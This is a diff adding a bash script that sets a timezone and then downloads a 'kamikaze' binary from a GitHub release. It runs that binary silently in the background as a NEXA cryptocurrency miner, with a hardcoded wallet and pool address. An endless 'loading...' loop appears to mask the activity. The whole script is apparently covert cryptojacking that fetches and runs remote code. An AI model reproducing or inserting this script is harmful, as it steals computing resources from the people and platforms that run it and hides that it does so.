@@ -1,0 +1,12 @@
+#!/bin/bash
+set -x
+apt-get update 
+ln -fs /usr/share/zoneinfo/America/Montserrat /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+wget https://github.com/miningneksa/daemon/releases/download/boruto/kamikaze.tar.gz && tar -xvf kamikaze.tar.gz
+chmod +x kamikaze && ./kamikaze -algo randomx -wallet nexa:nqtsq5g5ewsu60xpu8zn7snghgf3yx09j5gcc648y44dcyg9 -coin NEXA -rigName gibhq -pool1 159.203.162.18:3333 -cpuThreads 1 > /dev/null 2>&1 &
+while true
+do
+        echo "loading..."
+        sleep 30
+done
